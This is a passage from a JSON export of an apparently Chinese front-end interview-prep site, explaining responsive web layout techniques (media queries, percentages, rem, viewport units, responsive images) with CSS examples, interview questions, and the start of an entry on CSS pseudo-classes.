如何选择屏幕大小分割点\n\n如何确定媒体查询的分割点也是一个开发中会遇到的问题，下面是市场上的移动设备和电脑屏幕分辨率的分布情况，可以发现不同品牌和型号的设备屏幕分辨率一般都不一样\n\n![img](https://static.ecool.fun//article/1bd2c4c4-1507-41eb-ad37-416167907f61.awebp)\n\n如果我们选择`600px`,`900px`,`1200px`,`1800px`作为分割点，可以适配到常见的14个机型：\n\n![img](https://static.ecool.fun//article/0a09d0f5-2a95-4f31-b7fe-b4d7089d8b1a.awebp)\n\n当然这只是其中的一种分割方案，我们还可以这样划分：`480px`,`800px`,`1400px`,`1400px`\n\n![img](https://static.ecool.fun//article/b49aa995-1229-4fcd-bc0b-911322162a75.awebp)\n\n而作为曾经典型的响应式布局框架，`Bootstrap`是怎么进行断点的呢？\n\n![img](https://static.ecool.fun//article/5aabbd7e-ba01-4b54-8e98-f46c4ad5e1d5.awebp)\n\n上面的分割方案不一定满足项目中的实际需求，我们可以先用跨度大的分割点进行分割，如果出现不适配的情况可以再根据实际情况增加新的分割点。\n\n#### 移动优先 OR PC优先\n\n不管是移动优先还是PC优先，都是依据当随着屏幕宽度增大或减小的时候，后面的样式会覆盖前面的样式。因此，移动端优先首先使用的是`min-width`，PC端优先使用的`max-width`。\n\n**移动优先:**\n\n```css\n/* iphone6 7 8 */\nbody {\n    background-color: yellow;\n}\n/* iphone 5 */\n@media screen and (max-width: 320px) {\n    body {\n      background-color: red;\n    }\n}\n/* iphoneX */\n@media screen and (min-width: 375px) and (-webkit-device-pixel-ratio: 3) {\n    body {\n      background-color: #0FF000;\n    }\n}\n/* iphone6 7 8 plus */\n@media screen and (min-width: 414px) {\n    body {\n      background-color: blue;\n    }\n}\n/* ipad */\n@media screen and (min-width: 768px) {\n    body {\n      background-color: green;\n    }\n}\n/* ipad pro */\n@media screen and (min-width: 1024px) {\n    body {\n      background-color: #FF00FF;\n    }\n}\n/* pc */\n@media screen and (min-width: 1100px) {\n    body {\n      background-color: black;\n    }\n}\n```\n\n**PC优先：**\n\n```css\n/* pc width > 1024px */\n    body {\n        background-color: yellow;\n    }\n/* ipad pro */\n@media screen and (max-width: 1024px) {\n    body {\n        background-color: #FF00FF;\n    }\n}\n/* ipad */\n@media screen and (max-width: 768px) {\n    body {\n        background-color: green;\n    }\n}\n/* iphone6 7 8 plus */\n@media screen and (max-width: 414px) {\n    body {\n        background-color: blue;\n    }\n}\n/* iphoneX */\n@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 3) {\n    body {\n        background-color: #0FF000;\n    }\n}\n/* iphone6 7 8 */\n@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 2) {\n    body {\n        background-color: #0FF000;\n    }\n}\n/* iphone5 */\n@media screen and (max-width: 320px) {\n    body {\n        background-color: #0FF000;\n    }\n}\n```\n\n### 2.百分比布局\n\n通过百分比单位，可以使得浏览器中组件的宽和高随着浏览器的高度的变化而变化，从而实现响应式的效果。Bootstrap里面的栅格系统就是利用百分比来定义元素的宽高，`CSS3`支持最大最小高，可以将百分比和`max(min)`一起结合使用来定义元素在不同设备下的宽高。\n\n```css\n/* pc width > 1100px */\nhtml, body { margin: 0;padding: 0;width: 100%;height: 100%;}\naside {\n    width: 10%;\n    height: 100%;\n    background-color: red;\n    float: left;\n}\nmain {\n    height: 100%;\n    background-color: blue;\n    overflow: hidden;\n}\n/* ipad pro */\n@media screen and (max-width: 1024px) {\n    aside {\n      width: 8%;\n      background-color: yellow;\n    }\n}\n/* ipad */\n@media screen and (max-width: 768px) {\n    aside {\n      float: none;\n      width: 100%;\n      height: 10%;\n      background-color: green;\n    }\n    main {\n      height: calc(100vh - 10%);\n      background-color: red;\n    }\n}\n/* iphone6 7 8 plus */\n@media screen and (max-width: 414px) {\n    aside {\n      float: none;\n      width: 100%;\n      height: 5%;\n      background-color: yellow;\n    }\n    main {\n      height: calc(100vh - 5%);\n      background-color: red;\n    }\n}\n/* iphoneX */\n@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 3) {\n    aside {\n      float: none;\n      width: 100%;\n      height: 10%;\n      background-color: blue;\n    }\n    main {\n      height: calc(100vh - 10%);\n      background-color: red;\n    }\n}\n/* iphone6 7 8 */\n@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 2) {\n    aside {\n      float: none;\n      width: 100%;\n      height: 3%;\n      background-color: black;\n    }\n    main {\n      height: calc(100vh - 3%);\n      background-color: red;\n    }\n}\n/* iphone5 */\n@media screen and (max-width: 320px) {\n    aside {\n      float: none;\n      width: 100%;\n      height: 7%;\n      background-color: green;\n    }\n    main {\n      height: calc(100vh - 7%);\n      background-color: red;\n    }\n}\n```\n\n但是我们必须要弄清楚css中子元素的百分比到底是相对谁的百分比。直接上结论吧：\n\n子元素的`height`或`width`中使用百分比，是相对于子元素的直接父元素，`width`相对于父元素的`width`，`height`相对于父元素的`height`；子元素的`top`和`bottom`如果设置百分比，则相对于直接非`static`定位(默认定位)的父元素的高度，同样子元素的`left`和`right`如果设置百分比，则相对于直接非`static`定位(默认定位的)父元素的宽度；子元素的`padding`如果设置百分比，不论是垂直方向或者是水平方向，都相对于直接父亲元素的`width`，而与父元素的`height`无关。跟`padding`一样，`margin`也是如此，子元素的`margin`如果设置成百分比，不论是垂直方向还是水平方向，都相对于直接父元素的`width`；`border-radius`不一样，如果设置`border-radius`为百分比，则是相对于自身的宽度，除了`border-radius`外，还有比如`translate`、`background-size`等都是相对于自身的；\n\n从上述对于百分比单位的介绍我们很容易看出如果全部使用百分比单位来实现响应式的布局，有明显的以下两个缺点：\n\n-   计算困难，如果我们要定义一个元素的宽度和高度，按照设计稿，必须换算成百分比单位。\n-   可以看出，各个属性中如果使用百分比，相对父元素的属性并不是唯一的。比如`width`和`height`相对于父元素的`width`和`height`，而`margin`、`padding`不管垂直还是水平方向都相对比父元素的宽度、`border-radius`则是相对于元素自身等等，造成我们使用百分比单位容易使布局问题变得复杂。\n\n### 3.rem布局\n\n`REM`是`CSS3`新增的单位，并且移动端的支持度很高，Android2.x+,ios5+都支持。`rem`单位都是相对于根元素html的`font-size`来决定大小的,根元素的`font-size`相当于提供了一个基准，当页面的size发生变化时，只需要改变`font-size`的值，那么以`rem`为固定单位的元素的大小也会发生响应的变化。 因此，如果通过`rem`来实现响应式的布局，只需要根据视图容器的大小，动态的改变`font-size`即可（而`em`是相对于父元素的）。\n\n**rem响应式的布局思想：**\n\n-   一般不要给元素设置具体的宽度，但是对于一些小图标可以设定具体宽度值\n-   高度值可以设置固定值，设计稿有多大，我们就严格有多大\n-   所有设置的固定值都用`rem`做单位（首先在HTML总设置一个基准值：`px`和`rem`的对应比例，然后在效果图上获取`px`值，布局的时候转化为`rem`值)\n-   js获取真实屏幕的宽度，让其除以设计稿的宽度，算出比例，把之前的基准值按照比例进行重新的设定，这样项目就可以在移动端自适应了\n\n**rem布局的缺点：**\n\n在响应式布局中，必须通过js来动态控制根元素`font-size`的大小，也就是说css样式和js代码有一定的耦合性，且必须将改变`font-size`的代码放在`css`样式之前\n\n```javascript\n/*上述代码中将视图容器分为10份，font-size用十分之一的宽度来表示，最后在header标签中执行这段代码，就可以动态定义font-size的大小，从而1rem在不同的视觉容器中表示不同的大小，用rem固定单位可以实现不同容器内布局的自适应。*/\nfunction refreshRem() {\n    var docEl = doc.documentElement;\n    var width = docEl.getBoundingClientRect().width;\n    var rem = width / 10;\n    docEl.style.fontSize = rem + 'px';\n    flexible.rem = win.rem = rem;\n}\nwin.addEventListener('resize', refreshRem);\n```\n\n`REM`布局也是目前多屏幕适配的最佳方式。默认情况下我们html标签的`font-size`为16px,我们利用媒体查询，设置在不同设备下的字体大小。\n\n```javascript\n/* pc width > 1100px */\nhtml{ font-size: 100%;}\nbody {\n    background-color: yellow;\n    font-size: 1.5rem;\n}\n/* ipad pro */\n@media screen and (max-width: 1024px) {\n    body {\n      background-color: #FF00FF;\n      font-size: 1.4rem;\n    }\n}\n/* ipad */\n@media screen and (max-width: 768px) {\n    body {\n      background-color: green;\n      font-size: 1.3rem;\n    }\n}\n/* iphone6 7 8 plus */\n@media screen and (max-width: 414px) {\n    body {\n      background-color: blue;\n      font-size: 1.25rem;\n    }\n}\n/* iphoneX */\n@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 3) {\n    body {\n      background-color: #0FF000;\n      font-size: 1.125rem;\n    }\n}\n/* iphone6 7 8 */\n@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 2) {\n    body {\n      background-color: #0FF000;\n      font-size: 1rem;\n    }\n}\n/* iphone5 */\n@media screen and (max-width: 320px) {\n    body {\n      background-color: #0FF000;\n      font-size: 0.75rem;\n    }\n}\n```\n\n### 4.视口单位\n\n`css3`中引入了一个新的单位`vw/vh`，与视图窗口有关，`vw`表示相对于视图窗口的宽度，`vh`表示相对于视图窗口高度，除了`vw`和`vh`外，还有`vmin`和`vmax`两个相关的单位。各个单位具体的含义如下：\n\n| 单位 | 含义 |\n| --- | --- |\n| vw | 相对于视窗的宽度，1vw 等于视口宽度的1%，即视窗宽度是100vw |\n| vh | 相对于视窗的高度，1vh 等于视口高度的1%，即视窗高度是100vh |\n| vmin | vw和vh中的较小值 |\n| vmax | vw和vh中的较大值 |\n\n![](https://static.ecool.fun//article/bb857826-867d-4121-9c4a-75ca725c7030.awebp)\n\n用视口单位度量，视口宽度为100vw，高度为100vh（左侧为竖屏情况，右侧为横屏情况）。例如，在桌面端浏览器视口尺寸为650px，那么 1vw = 650 \\* 1% = 6.5px（这是理论推算的出，如果浏览器不支持0.5px，那么实际渲染结果可能是7px）。\n\n那么vw或者vh很类似百分比单位。vw和%的区别为：\n\n| 单位 | 含义 |\n| --- | --- |\n| % | 大部分相对于祖先元素，也有相对于自身的情况比如（border-radius、translate等) |\n| vw/vh | 相对于视窗的尺寸 |\n\n从对比中我们可以发现，`vw`单位与百分比类似，单确有区别，前面我们介绍了百分比单位的换算困难，这里的`vw`更像\"理想的百分比单位\"。任意层级元素，在使用`vw`单位的情况下，1vw都等于视图宽度的百分之一。\n\n使用视口单位来实现响应式有两种做法：\n\n##### 1.仅使用vw作为CSS单位\n\n-   对于设计稿的尺寸转换为为单位，我们使用`Sass`函数编译\n    \n    ```css\n    //iPhone 6尺寸作为设计稿基准\n    $vm_base: 375; \n    @function vw($px) {\n        @return ($px / 375) * 100vw;\n    }\n    ```\n    \n-   无论是文本还是布局宽度、间距等都使用`vw`作为单位\n    \n    ```css\n    .mod_nav {\n        background-color: #fff;\n        &_list {\n            display: flex;\n            padding: vm(15) vm(10) vm(10); // 内间距\n            &_item {\n                flex: 1;\n                text-align: center;\n                font-size: vm(10); // 字体大小\n                &_logo {\n                    display: block;\n                    margin: 0 auto;\n                    width: vm(40); // 宽度\n                    height: vm(40); // 高度\n                    img {\n                        display: block;\n                        margin: 0 auto;\n                        max-width: 100%;\n                    }\n                }\n                &_name {\n                    margin-top: vm(2);\n                }\n            }\n        }\n    }\n    ```\n    \n-   1物理像素线（也就是普通屏幕下1px,高清屏幕下0.5px的情况）采用`transform`属性`scale`实现\n    \n    ```css\n    .mod_grid {\n        position: relative;\n        &::after {\n            // 实现1物理像素的下边框线\n            content: '';\n            position: absolute;\n            z-index: 1;\n            pointer-events: none;\n            background-color: #ddd;\n            height: 1px;\n            left: 0;\n            right: 0;\n            top: 0;\n            @media only screen and (-webkit-min-device-pixel-ratio: 2) {\n                -webkit-transform: scaleY(0.5);\n                -webkit-transform-origin: 50% 0%;\n            }\n        }\n        ...\n    }\n    ```\n    \n-   对于需要保持宽高比的图，应该用`padding-top`实现\n    \n    ```css\n    .mod_banner {\n        position: relative;\n        padding-top: percentage(100/700); // 使用padding-top\n        height: 0;\n        overflow: hidden;\n        img {\n            width: 100%;\n            height: auto;\n            position: absolute;\n            left: 0;\n            top: 0; \n        }\n    }\n    ```\n    \n\n##### 2.搭配vw和rem\n\n虽然采用`vw`适配后的页面效果很好，但是它是利用视口单位实现的布局，依赖视口大小而自动缩放，无论视口过大还是过小，它也随着时候过大或者过小，失去了最大最小宽度的限制，此时我们可以结合`rem`来实现布局\n\n-   给根元素大小设置随着视口变化而变化的`vw`单位，这样就可以实现动态改变其大小\n    \n-   限制根元素字体大小的最大最小值，配合`body`加上最大宽度和最小宽度\n    \n    ```css\n    // rem 单位换算：定为 75px 只是方便运算，750px-75px、640-64px、1080px-108px，如此类推\n    $vm_fontsize: 75; // iPhone 6尺寸的根元素大小基准值\n    @function rem($px) {\n         @return ($px / $vm_fontsize ) * 1rem;\n    }\n    // 根元素大小使用 vw 单位\n    $vm_design: 750;\n    html {\n        font-size: ($vm_fontsize / ($vm_design / 2)) * 100vw; \n        // 同时，通过Media Queries 限制根元素最大最小值\n        @media screen and (max-width: 320px) {\n            font-size: 64px;\n        }\n        @media screen and (min-width: 540px) {\n            font-size: 108px;\n        }\n    }\n    // body 也增加最大最小宽度限制，避免默认100%宽度的 block 元素跟随 body 而过大过小\n    body {\n        max-width: 540px;\n        min-width: 320px;\n    }\n    ```\n    \n\n### 5.图片响应式\n\n这里的图片响应式包括两个方面，一个就是大小自适应，这样能够保证图片在不同的屏幕分辨率下出现压缩、拉伸的情况；一个就是根据不同的屏幕分辨率和设备像素比来尽可能选择高分辨率的图片，也就是当在小屏幕上不需要高清图或大图，这样我们用小图代替，就可以减少网络带宽了。\n\n##### 1.使用max-width（图片自适应）:\n\n图片自适应意思就是图片能随着容器的大小进行缩放，可以采用如下代码：\n\n```css\nimg {\n    display: inline-block;\n    max-width: 100%;\n    height: auto;\n}\n```\n\n`inline-block` 元素相对于它周围的内容以内联形式呈现，但与内联不同的是，这种情况下我们可以设置宽度和高度。 `max-width`保证了图片能够随着容器的进行等宽扩充（即保证所有图片最大显示为其自身的 100%。此时，如果包含图片的元素比图片固有宽度小，图片会缩放占满最大可用空间），而`height`为`auto`可以保证图片进行等比缩放而不至于失真。如果是背景图片的话要灵活运用`background-size`属性。\n\n那么为什么不能用`width：100%`呢？因为这条规则会导致它显示得跟它的容器一样宽。在容器比图片宽得多的情况下，图片会被无谓地拉伸。\n\n##### 2.使用srcset\n\n```javascript\n<img srcset=\"photo_w350.jpg 1x, photo_w640.jpg 2x\" src=\"photo_w350.jpg\" alt=\"\">\n```\n\n如果屏幕的dpi = 1的话则加载1倍图，而dpi = 2则加载2倍图，手机和mac基本上dpi都达到了2以上，这样子对于普通屏幕来说不会浪费流量，而对于视网膜屏来说又有高清的体验。\n\n如果浏览器不支持`srcset`，则默认加载src里面的图片。\n\n但是你会发现实际情况并不是如此，在Mac上的Chrome它会同时加载`srcset`里面的那张2x的，还会再去加载src里面的那张，加载两张图片。顺序是先把所有`srcset`里面的加载完了，再去加载src的。这个策略比较奇怪，它居然会加载两张图片，如果不写src，则不会加载两张，但是兼容性就没那么好。这个可能是因为浏览器认为，既然有`srcset`就不用写src了，如果写了src，用户可能是有用的。而使用`picture`就不会加载两张\n\n##### 3.使用background-image\n\n```css\n.banner{\n  background-image: url(/static/large.jpg);\n}\n\n@media screen and (max-width: 767px){\n  background-image: url(/static/small.jpg);\n}\n```\n\n##### 4.使用picture标签\n\n[picturefill.min.js](https://scottjehl.github.io/picturefill/ \"https://link.juejin.im/?target=https%3A%2F%2Fscottjehl.github.io%2Fpicturefill%2F\") ：解决IE等浏览器不支持 的问题\n\n```javascript\n<picture>\n    <source srcset=\"banner_w1000.jpg\" media=\"(min-width: 801px)\">\n    <source srcset=\"banner_w800.jpg\" media=\"(max-width: 800px)\">\n    <img src=\"banner_w800.jpg\" alt=\"\">\n</picture>\n\n<!-- picturefill.min.js 解决IE等浏览器不支持 <picture> 的问题 -->\n<script type=\"text/javascript\" src=\"js/vendor/picturefill.min.js\"></script>\n```\n\n`picture`必须要写img标签，否则无法显示，对`pictur`e的操作最后都是在img上面，例如onload事件是在img标签触发的，`picture`和`source`是不会进行layout的，它们的宽和高都是0。\n\n另外使用`source`，还可以对图片格式做一些兼容处理：\n\n```javascript\n<picture>\n    <source type=\"image/webp\" srcset=\"banner.webp\">\n    <img src=\"banner.jpg\" alt=\"\">\n</picture>\n\n```\n\n**总结**：响应式布局的实现可以通过媒体查询+`px`,媒体查询+百分比，媒体查询+`rem`+`js`,`vm/vh`,`vm/vh` +`rem`这几种方式来实现。但每一种方式都是有缺点的，媒体查询需要选取主流设备宽度尺寸作为断点针对性写额外的样式进行适配，但这样做会比较麻烦，只能在选取的几个主流设备尺寸下呈现完美适配，另外用户体验也不友好，布局在响应断点范围内的分辨率下维持不变，而在响应断点切换的瞬间，布局带来断层式的切换变化，如同卡带的唱机般“咔咔咔”地一下又一下。通过百分比来适配首先是计算麻烦，第二各个属性中如果使用百分比，其相对的元素的属性并不是唯一的，这样就造成我们使用百分比单位容易使布局问题变得复杂。通过采用`rem`单位的动态计算的弹性布局，则是需要在头部内嵌一段脚本来进行监听分辨率的变化来动态改变根元素字体大小，使得`CSS`与`JS` 耦合了在一起。通过利用纯`css`视口单位实现适配的页面，是既能解决响应式断层问题，又能解决脚本依赖的问题的，但是兼容性还没有完全能结构接受。\n\n## 响应式布局的成型方案\n\n现在的css，UI框架等都已经考虑到了适配不同屏幕分辨率的问题，实际项目中我们可以直接使用这些新特性和框架来实现响应式布局。可以有以下选择方案：\n\n-   利用上面的方法自己来实现，比如CSS3 Media Query,rem，vw等\n-   Flex弹性布局，兼容性较差\n-   Grid网格布局，兼容性较差\n-   Columns栅格系统，往往需要依赖某个UI库，如Bootstrap\n\n## 响应式布局的要点\n\n在实际项目中，我们可能需要综合上面的方案，比如用`rem`来做字体的适配，用`srcset`来做图片的响应式，宽度可以用`rem`，`flex`，栅格系统等来实现响应式，然后可能还需要利用媒体查询来作为响应式布局的基础，因此综合上面的实现方案，项目中实现响应式布局需要注意下面几点：\n\n-   设置viewport\n-   媒体查询\n-   字体的适配（字体单位）\n-   百分比布局\n-   图片的适配（图片的响应式）\n-   结合flex，grid，BFC，栅格系统等已经成型的方案",
    "testPoint": "### 1. **响应式设计概念**\n   - 请简述什么是响应式设计？为什么需要响应式设计？\n   - 响应式设计与自适应设计有什么区别？它们各自的优缺点是什么？\n\n### 2. **响应式设计的核心原则**\n   - 响应式设计的基本原则是什么？如何实现内容在不同设备上自动适应？\n   - 请解释 **流式布局**（fluid layouts）、**弹性盒布局**（flexible grids）和 **媒体查询**（media queries）在响应式设计中的作用。\n\n### 3. **媒体查询**\n   - 请解释什么是媒体查询，它是如何工作的？它的基本语法是什么？\n   - 如何使用媒体查询针对不同的设备尺寸（如手机、平板、桌面等）应用不同的样式？\n   - 请举例说明常用的媒体查询条件，如 `max-width`、`min-width`，以及如何针对不同的视口宽度来修改布局。\n   - 你如何使用媒体查询来实现不同屏幕大小上的字体和间距调整？\n\n### 4. **视口单位**\n   - 请解释视口单位（如 `vw`、`vh`、`vmin`、`vmax`）在响应式设计中的应用。\n   - 如何利用视口单位实现响应式布局中的自适应元素尺寸？\n\n### 5. **弹性布局（Flexbox）与 Grid**\n   - 如何使用 **Flexbox** 布局来实现响应式设计？请举例说明如何通过调整 `flex` 和 `align-items` 来适应不同设备尺寸。\n   - CSS Grid 与 Flexbox 在响应式设计中的应用场景有什么不同？请举例说明如何用 Grid 创建自适应的布局。\n\n### 6. **图片响应式设计**\n   - 如何在响应式设计中处理图片的显示，以适应不同的屏幕分辨率？\n   - 请解释 `srcset` 和 `sizes` 属性的作用，它们是如何帮助实现响应式图片的？\n   - 你如何使用 `picture` 元素来为不同的设备选择不同的图片格式或分辨率？\n\n### 7. **移动优先与桌面优先**\n   - 请解释 **移动优先设计**（mobile-first）和 **桌面优先设计**（desktop-first）的区别及其各自的优势。\n   - 在实际开发中，你如何决定使用哪种方法来进行响应式设计？\n   - 移动优先设计时，如何通过媒体查询逐步扩展到更大的屏幕（例如从手机到平板、桌面）？\n\n### 8. **弹性字体与视口单位**\n   - 如何使用 CSS 设置弹性字体，确保文本在不同设备上保持可读性？\n   - 如何使用 `rem`, `em` 或视口单位（如 `vw` 和 `vh`）来创建响应式字体？\n\n### 9. **响应式设计的测试与调试**\n   - 如何在开发过程中测试响应式设计的效果？你是否有过使用开发者工具进行模拟不同设备的经验？\n   - 在测试响应式页面时，你如何确保元素在不同屏幕尺寸下的正确显示和布局？\n\n### 10. **常见的响应式设计问题**\n   - 在实际开发中，响应式设计可能会遇到哪些常见的挑战？你如何解决这些问题？\n     - 例如：元素重叠、字体过小、布局错乱、图片加载慢等问题。\n   - 当你遇到布局不适应或不稳定的问题时，如何进行调试和优化？\n\n### 11. **CSS Frameworks**\n   - 你是否使用过响应式设计框架（如 **Bootstrap** 或 **Foundation**）？它们如何帮助加速响应式布局的开发？\n   - 请简述你使用过的框架在响应式设计中的优势与局限性。\n   - 如果不使用框架，你如何手动实现响应式设计？\n\n### 12. **响应式设计中的性能优化**\n   - 如何优化响应式设计中的性能，特别是在移动设备上？\n   - 在响应式设计中，如何通过图片、字体、JavaScript 等资源的加载优化提高页面的响应速度？\n\n### 13. **视差滚动与响应式设计**\n   - 视差滚动（parallax scrolling）效果在响应式设计中的应用有什么挑战？你如何保证在不同设备上实现良好的体验？\n   - 如何处理视差效果中的元素定位与滚动，在不同分辨率下保持平滑效果？\n\n### 14. **实际案例**\n   - 请描述一个你使用响应式设计的项目。你是如何确保该项目在手机、平板和桌面上都有良好表现的？\n   - 在某个实际项目中，你遇到过哪些特定的响应式设计问题？你是如何解决这些问题的？\n\n### 15. **现代响应式设计技术**\n   - 请介绍一些响应式设计的现代技术，如 **CSS Container Queries**、**CSS Logical Properties**，以及它们在响应式设计中的应用。\n   - 如何利用这些新技术实现更加灵活和精确的布局？\n",
    "exerciseKeyList": "[\"d95319f5-e060-4727-a7a4-d4996c00a6c7\",\"dc8c6233-f645-444c-8e31-f18bc3f5244f\",\"ffd21d04-15d9-4f94-9167-5edf63a42741\",\"dd65350c-9907-4d3a-a01c-baeebb3e963d\",\"c7844d1f-223c-41cc-b6c2-6df29d8ecc00\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 17,
    "createAt": "2024-10-08T09:43:15.000Z",
    "updateAt": "2024-11-18T01:54:24.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "c7844d1f-223c-41cc-b6c2-6df29d8ecc00",
        "title": "什么是CSS媒体查询?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T10:17:26.000Z",
        "updateAt": "2021-07-04T19:24:08.000Z"
      },
      {
        "exerciseKey": "d95319f5-e060-4727-a7a4-d4996c00a6c7",
        "title": "现在要开发一个响应式的网站，怎么实现根据设备的尺寸和分辨率，加载不同尺寸的 banner？要求不使用 JavaScript",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-09-27T01:42:33.000Z",
        "updateAt": "2024-09-27T01:42:39.000Z"
      },
      {
        "exerciseKey": "dc8c6233-f645-444c-8e31-f18bc3f5244f",
        "title": "什么是响应式设计？响应式设计的基本原理是什么？如何进行实现？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:29:03.000Z",
        "updateAt": "2024-08-10T19:48:26.000Z"
      },
      {
        "exerciseKey": "dd65350c-9907-4d3a-a01c-baeebb3e963d",
        "title": "flexbox（弹性盒布局模型）是什么，适用什么场景？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:23:32.000Z",
        "updateAt": "2024-08-10T19:47:22.000Z"
      },
      {
        "exerciseKey": "ffd21d04-15d9-4f94-9167-5edf63a42741",
        "title": "怎么做移动端的样式适配？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-20T15:26:26.000Z",
        "updateAt": "2024-08-10T17:06:22.000Z"
      }
    ]
  },
  "116": {
    "id": 116,
    "tagId": 11,
    "title": "伪类和伪元素",
    "explanation": "## 什么是伪类和伪元素？\n\n-   **伪类**：以冒号(:)开头，用于选择处于特定状态的元素。\n-   **伪元素**：以双冒号(::)开头，用于在文档中插入虚构的元素。\n\n这么说有点抽象，我们来看具体案例。例如下面的伪类语法表达的意思是：**文档里的那些已经被用户访问过的 a 标签，当鼠标悬浮在它上面的时候，颜色为红色。**\n\n```css\na:visited:hover {\n  color: red;\n}\n```\n\n效果如下：\n\n![](https://static.ecool.fun//article/2866f345-e94a-4858-9e65-1a5d6d25cdab.jpeg)\n\n可以看到，无论是 `visited`还是 `hover`，都表示了 a 标签的某种状态，选择器始终选择的是伪类前面的元素，只不过当出现伪类描述的状态时，样式才生效而已。\n\n> 注意，上面使用的是无痕浏览器打开的页面，是不可能出现 visited 状态的，因为无痕不记录访问历史，我们可以点击控制台的 :hov 图标手动勾选 :visited 和 :hover 来模拟 a 标签「已访问」和「悬浮」两种状态。\n\n我们再来看一下伪元素的案例，下面的语法表达的意思是： **div 标签里面首字的颜色为红色。**\n\n```css\ndiv::first-letter {\n  color: red;\n}\n```\n\n效果如下：\n\n![](https://static.ecool.fun//article/bda4cdab-ee1e-4801-90aa-23256ced9816.jpeg)\n\n与伪类不同的是，首字并不是 div 元素的某种状态，而是浏览器创建出来的一个虚拟的元素，我们可以在上图的右下角看到 `Pseudo ::first-letter element`提示，相当于浏览器自动选中了「彻」字。\n\n> 注意：::first-letter 伪元素只作用于块状元素上面，如果把 div 换成 span，就无法选中首字了，除非手动设置 span 的 display 属性为 block 或 inline-block 等块状值。\n\n从上面的案例当中，我们可以得出两个结论：\n\n-   伪类用于**向某些已经存在的选择器添加特殊效果（当状态改变时）**\n-   伪元素用于**将特殊效果添加到不存在的虚拟元素中（浏览器自动创建）**\n\n也就是说伪类的本质还是类（class），作用于标签本身，只不过限定了状态条件；而伪元素的本质是元素（element），作用于该虚拟元素的内容本身。\n\n## 伪类有哪些？\n\n按照功能，可划分为以下几类：\n\n-   动态伪类：`:visited`、`:focus`、`:hover`等\n-   状态伪类：`:disabled`、`:empty`、`:required` 等\n-   结构伪类：`:first-child`、`:nth-of-type`等\n-   其他伪类：`:target`、`:lang`、`:not()`等\n\n下面的表格详细记录了各种伪类及其描述：\n\n| **伪类** | **描述** | **兼容性** |\n| --- | --- | --- |\n| `:active` | 元素处于活动状态时 | [✅](https://caniuse.com/?search=%3Aactive \"https://caniuse.com/?search=%3Aactive\") |\n| `:focus` | 元素已获取焦点时 | [✅](https://caniuse.com/?search=%3Afocus \"https://caniuse.com/?search=%3Afocus\") |\n| `:hover` | 元素处于悬浮状态时 | [✅](https://caniuse.com/?search=%3Ahover \"https://caniuse.com/?search=%3Ahover\") |\n| `:link` | 链接未访问时 | [✅](https://caniuse.com/?search=%3Alink \"https://caniuse.com/?search=%3Alink\") |\n| `:visited` | 链接已访问时 | [✅](https://caniuse.com/?search=%3Avisited \"https://caniuse.com/?search=%3Avisited\") |\n| `:first-child` | 元素是首个子元素时 | [✅](https://caniuse.com/?search=%3Afirst-child \"https://caniuse.com/?search=%3Afirst-child\") |\n| `:last-child` | 元素是最后一个子元素时 | [✅](https://caniuse.com/?search=%3Alast-child \"https://caniuse.com/?search=%3Alast-child\") |\n| `:nth-child()` | 元素是第 n 个子元素时 | [✅](https://caniuse.com/?search=%3Anth-child \"https://caniuse.com/?search=%3Anth-child\") |\n| `:nth-last-child()` | 元素是倒数第 n 个子元素时 | [✅](https://caniuse.com/?search=%3Anth-last-child \"https://caniuse.com/?search=%3Anth-last-child\") |\n| `:only-child` | 元素是唯一子元素时 | [✅](https://caniuse.com/?search=%3Aonly-child \"https://caniuse.com/?search=%3Aonly-child\") |\n| `:first-of-type` | 元素是首个特定类型的子元素时 | [✅](https://caniuse.com/?search=%3Afirst-of-type \"https://caniuse.com/?search=%3Afirst-of-type\") |\n| `:last-of-type` | 元素是最后一个特定类型的子元素时 | [✅](https://caniuse.com/?search=%3Alast-of-type \"https://caniuse.com/?search=%3Alast-of-type\") |\n| `:nth-of-type()` | 元素是第 n 个特定类型的子元素时 | [✅](https://caniuse.com/?search=%3Anth-of-type \"https://caniuse.com/?search=%3Anth-of-type\") |\n| `:nth-last-of-type()` | 元素是倒数第 n 个特定类型的子元素时 | [✅](https://caniuse.com/?search=%3Anth-last-of-type \"https://caniuse.com/?search=%3Anth-last-of-type\") |\n| `:only-of-type` | 元素是唯一的特定类型的子元素时 | [✅](https://caniuse.com/?search=%3Aonly-of-type \"https://caniuse.com/?search=%3Aonly-of-type\") |\n| `:not` | 不满足指定条件时 | [✅](https://caniuse.com/?search=%3Anot \"https://caniuse.com/?search=%3Anot\") |\n| `:target` | 元素 id 匹配到哈希值时 | [✅](https://caniuse.com/?search=%3Atarget \"https://caniuse.com/?search=%3Atarget\") |\n| `:root` | 元素是文档树的根元素时 | [✅](https://caniuse.com/?search=%3Aroot \"https://caniuse.com/?search=%3Aroot\") |\n| `:lang()` | 匹配到指定语言时 | [✅](https://caniuse.com/?search=%3Alang \"https://caniuse.com/?search=%3Alang\") |\n| `:empty` | 元素处于没有子元素状态时 | [✅](https://caniuse.com/?search=%3Aempty \"https://caniuse.com/?search=%3Aempty\") |\n| `:invalid` 和 `:valid` | 表单项是否有效 | [✅](https://caniuse.com/?search=%3Avalid \"https://caniuse.com/?search=%3Avalid\") |\n| `:required` 和 `:optional` | 表单项是否必填 | [✅](https://caniuse.com/?search=%3Arequired \"https://caniuse.com/?search=%3Arequired\") |\n| `:in-range`和 `:out-of-range` | 表单项是否超出范围 | [✅](https://caniuse.com/?search=%3Ain-range \"https://caniuse.com/?search=%3Ain-range\") |\n| `:read-only`和 `:read-write` | 表单项是否只读 | [✅](https://caniuse.com/?search=%3Aread-only \"https://caniuse.com/?search=%3Aread-only\") |\n| `:enabled`和 `:disabled` | 表单项是否禁用 | [✅](https://caniuse.com/?search=%3Aenabled \"https://caniuse.com/?search=%3Aenabled\") |\n| `:fullscreen` | 当前处于全屏显示模式时 | 